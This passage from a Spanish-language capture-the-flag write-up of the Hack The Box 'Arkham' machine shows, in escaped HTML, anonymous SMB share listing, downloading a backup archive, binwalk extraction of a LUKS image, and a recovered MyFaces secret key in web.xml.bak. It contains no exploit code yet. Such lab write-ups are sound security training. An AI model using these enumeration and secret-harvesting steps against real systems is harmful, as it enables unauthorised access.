Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 68.49 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;smb&#34;&gt;SMB&lt;/h2&gt;
&lt;p&gt;Buscamos los sharenames a los que tengamos acceso.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/arkham# smbclient -L 10.10.10.130
Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;oot&lt;span class=&#34;s1&#34;&gt;&amp;#39;s password: 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	Sharename       Type      Comment
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	---------       ----      -------
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	ADMIN$          Disk      Remote Admin
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	BatShare        Disk      Master Wayne&amp;#39;&lt;/span&gt;s secrets
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Users           Disk      
Reconnecting with SMB1 &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; workgroup listing.
Connection to 10.10.10.130 failed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Error NT_STATUS_RESOURCE_NAME_NOT_FOUND&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Failed to connect with SMB1 -- no workgroup available
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;smb---batshare&#34;&gt;SMB - BatShare&lt;/h2&gt;
&lt;p&gt;Nos conectamos al sharename.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/arkham# smbclient &lt;span class=&#34;se&#34;&gt;\\\\&lt;/span&gt;10.10.10.130&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;BatShare
Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;oot&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password: 
Try &lt;span class=&#34;s2&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt; to get a list of possible commands.
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; 
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; ls
  .                                   D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Feb  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 13:00:10 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
  ..                                  D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Feb  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 13:00:10 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
  appserver.zip                       A  &lt;span class=&#34;m&#34;&gt;4046695&lt;/span&gt;  Fri Feb  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; 06:13:37 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;

		&lt;span class=&#34;m&#34;&gt;5158399&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;2123866&lt;/span&gt; blocks available
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; mget *
Get file appserver.zip? y
getting file &lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;ppserver.zip of size &lt;span class=&#34;m&#34;&gt;4046695&lt;/span&gt; as appserver.zip &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;265.1 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 265.1 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-03-25%2017-46-50.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/arkham# unzip appserver.zip 
Archive:  appserver.zip
  inflating: IMPORTANT.txt           
  inflating: backup.img              
root@sckull:~/htb/arkham# ls
appserver.zip  backup.img  IMPORTANT.txt  tmp
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos un archivo llamado &lt;code&gt;appserver.zip&lt;/code&gt; al descomprimir dicho archivo nos muestra dos archivos &lt;code&gt;backup.img&lt;/code&gt; e &lt;code&gt;IMPORTANT.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;IMPORTANT.txt&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn&amp;#39;t have unauthenticated access to it. - Bruce 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;file backup.img&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;backup.img: LUKS encrypted file, ver &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;aes, xts-plain64, sha256&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; UUID: d931ebb1-5edc-4453-8ab1-3d23bb85b38e
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-15%2016.20.54.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;BINWALK - backup.img&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos binwalk para ver el contenido del archivo &lt;code&gt;backup.img.&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;             0x0             LUKS_MAGIC version 0x1 aes sha256
&lt;span class=&#34;m&#34;&gt;519168&lt;/span&gt;        0x7EC00         Linux EXT filesystem, rev 1.0, ext4 filesystem data, &lt;span class=&#34;nv&#34;&gt;UUID&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;9c1e27b2-f91d-47d2-a167-49fd79957995
&lt;span class=&#34;m&#34;&gt;544768&lt;/span&gt;        0x85000         Linux EXT filesystem, rev 1.0, ext4 filesystem data, &lt;span class=&#34;nv&#34;&gt;UUID&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;9c1e27b2-f91d-47d2-a167-49fd79957995
&lt;span class=&#34;m&#34;&gt;551936&lt;/span&gt;        0x86C00         Linux EXT filesystem, rev 1.0, ext4 filesystem data, &lt;span class=&#34;nv&#34;&gt;UUID&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;9c1e27b2-f91d-47d2-a167-49fd79957995
&lt;span class=&#34;m&#34;&gt;8388608&lt;/span&gt;       0x800000        Linux EXT filesystem, rev 1.0, ext4 filesystem data, &lt;span class=&#34;nv&#34;&gt;UUID&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;9c1e27b2-f91d-47d2-a167-49fd79957995
&lt;span class=&#34;m&#34;&gt;8542755&lt;/span&gt;       0x825A23        Zip archive data, at least v1.0 to extract, name: Mask/tomcat-stuff/
&lt;span class=&#34;m&#34;&gt;8542831&lt;/span&gt;       0x825A6F        Zip archive data, at least v2.0 to extract, compressed size: 1006, uncompressed size: 2208, name: Mask/tomcat-stuff/tomcat-users.xml
&lt;span class=&#34;m&#34;&gt;8543929&lt;/span&gt;       0x825EB9        Zip archive data, at least v2.0 to extract, compressed size: 1151, uncompressed size: 3498, name: Mask/tomcat-stuff/web.xml.bak
&lt;span class=&#34;m&#34;&gt;8545167&lt;/span&gt;       0x82638F        Zip archive data, at least v2.0 to extract, compressed size: 709, uncompressed size: 1368, name: Mask/tomcat-stuff/context.xml
&lt;span class=&#34;m&#34;&gt;8545963&lt;/span&gt;       0x8266AB        Zip archive data, at least v2.0 to extract, compressed size: 621, uncompressed size: 1172, name: Mask/tomcat-stuff/jaspic-providers.xml
&lt;span class=&#34;m&#34;&gt;8546680&lt;/span&gt;       0x826978        Zip archive data, at least v2.0 to extract, compressed size: 367, uncompressed size: 832, name: Mask/tomcat-stuff/faces-config.xml
&lt;span class=&#34;m&#34;&gt;8547139&lt;/span&gt;       0x826B43        Zip archive data, at least v2.0 to extract, compressed size: 2599, uncompressed size: 7678, name: Mask/tomcat-stuff/server.xml
&lt;span class=&#34;m&#34;&gt;8549824&lt;/span&gt;       0x8275C0        Zip archive data, at least v2.0 to extract, compressed size: 18347, uncompressed size: 174021, name: Mask/tomcat-stuff/web.xml
&lt;span class=&#34;m&#34;&gt;8568254&lt;/span&gt;       0x82BDBE        Zip archive data, at least v1.0 to extract, compressed size: 39, uncompressed size: 39, name: Mask/tomcat-stuff/MANIFEST.MF
&lt;span class=&#34;m&#34;&gt;8568380&lt;/span&gt;       0x82BE3C        Zip archive data, at least v2.0 to extract, compressed size: 7353, uncompressed size: 7586, name: Mask/robin.jpeg
&lt;span class=&#34;m&#34;&gt;8575806&lt;/span&gt;       0x82DB3E        Zip archive data, at least v2.0 to extract, compressed size: 105045, uncompressed size: 105374, name: Mask/me.jpg
&lt;span class=&#34;m&#34;&gt;8680920&lt;/span&gt;       0x8475D8        Zip archive data, at least v2.0 to extract, compressed size: 687109, uncompressed size: 687160, name: Mask/mycar.jpg
&lt;span class=&#34;m&#34;&gt;9466405&lt;/span&gt;       0x907225        End of Zip archive, footer length: &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; .. &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;9638621&lt;/span&gt;       0x9312DD        Copyright string: &lt;span class=&#34;s2&#34;&gt;&amp;#34;copyright/ordfeminine/guillemotleft/logicalnot/hyphen/registered/macron/degree/plusminus/twosuperior/threesuperior/acute/mu/para&amp;#34;&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;9962496&lt;/span&gt;       0x980400        PDF document, version: &lt;span class=&#34;s2&#34;&gt;&amp;#34;1.4&amp;#34;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; ... &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;9978880&lt;/span&gt;       0x984400        XML document, version: &lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;9979118&lt;/span&gt;       0x9844EE        Copyright string: &lt;span class=&#34;s2&#34;&gt;&amp;#34;copyright ownership.&amp;#34;&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;9981952&lt;/span&gt;       0x985000        XML document, version: &lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;9986048&lt;/span&gt;       0x986000        XML document, version: &lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;9986286&lt;/span&gt;       0x9860EE        Copyright string: &lt;span class=&#34;s2&#34;&gt;&amp;#34;copyright ownership.&amp;#34;&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;9988096&lt;/span&gt;       0x986800        XML document, version: &lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;9988334&lt;/span&gt;       0x9868EE        Copyright string: &lt;span class=&#34;s2&#34;&gt;&amp;#34;copyright ownership.&amp;#34;&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;9990144&lt;/span&gt;       0x987000        XML document, version: &lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;9991168&lt;/span&gt;       0x987400        XML document, version: &lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;9991406&lt;/span&gt;       0x9874EE        Copyright string: &lt;span class=&#34;s2&#34;&gt;&amp;#34;copyright ownership.&amp;#34;&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;9999360&lt;/span&gt;       0x989400        XML document, version: &lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;9999598&lt;/span&gt;       0x9894EE        Copyright string: &lt;span class=&#34;s2&#34;&gt;&amp;#34;copyright ownership.&amp;#34;&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;10016768&lt;/span&gt;      0x98D800        JPEG image data, JFIF standard 1.01
&lt;span class=&#34;m&#34;&gt;10024960&lt;/span&gt;      0x98F800        JPEG image data, JFIF standard 1.01
&lt;span class=&#34;m&#34;&gt;10041344&lt;/span&gt;      0x993800        JPEG image data, EXIF standard
&lt;span class=&#34;m&#34;&gt;10041356&lt;/span&gt;      0x99380C        TIFF image data, little-endian offset of first image directory: &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;10057728&lt;/span&gt;      0x997800        JPEG image data, JFIF standard 1.01
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Dentro del archivo encontramos varios documentos que se refieren a archivos tomcat, imagenes, y archivos xml, descomprimimos los archivos con binwalk.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;binwalk -e backup.img
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-15%2016.29.02.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos varios archivos y carpetas, dentro de la carpeta Mask encontramos imagenes y una subcarpeta &lt;code&gt;tomcat-stuff&lt;/code&gt;, utilizamos binwalk con las imagenes para verificar que no tengan archivos ocultos dentro.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-15%2016.30.51.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ninguna de las imagenes contiene archivos que puedan servirnos, dentro de la carpeta &lt;code&gt;tomcat-stuff&lt;/code&gt; encontramos archivos de configuracion.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-15%2016.35.14.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Dentro de los archivos de configuracion encontramos un backup de uno de ellos &lt;code&gt;web.xml.bak&lt;/code&gt;, en su interior vemos la configuracion que tiene la pagina, algunos parametros de la configuracion contienen datos que sirven para encriptar los datos que se reciben y se envian por medio de la pagina web y podemos notar que esta corriendo en apache myfaces.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;Faces Servlet&lt;span class=&#34;nt&#34;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;*.faces&lt;span class=&#34;nt&#34;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;context-param&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;description&amp;gt;&lt;/span&gt;State saving method: &amp;#39;client&amp;#39; or &amp;#39;server&amp;#39; (=default). See JSF Specification 2.5.2&lt;span class=&#34;nt&#34;&gt;&amp;lt;/description&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;javax.faces.STATE_SAVING_METHOD&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;server&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;/context-param&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;context-param&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;org.apache.myfaces.SECRET&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;SnNGOTg3Ni0=&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;/context-param&amp;gt;&lt;/span&gt;
    &lt;span class=&#34;nt&#34;&gt;&amp;lt;context-param&amp;gt;&lt;/span&gt;
        &lt;span class=&#34;nt&#34;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;org.apache.myfaces.MAC_ALGORITHM&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
        &lt;span class=&#34;nt&#34;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;HmacSHA1&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
     &lt;span class=&#34;nt&#34;&gt;&amp;lt;/context-param&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;context-param&amp;gt;&lt;/span&gt;
